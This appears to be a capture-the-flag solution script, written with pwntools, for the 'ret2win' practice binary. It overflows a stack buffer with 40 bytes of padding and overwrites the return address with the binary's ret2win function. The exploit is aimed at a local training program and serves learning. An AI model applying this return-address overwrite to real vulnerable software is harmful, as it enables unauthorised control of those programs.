from pwn import *

binary = './ret2win'
elf = ELF(binary)

payload = b"A"*40
payload += p64(elf.symbols.ret2win)

io = process(binary)

io.recvuntil(b'> ')
io.sendline(payload)

io.interactive()
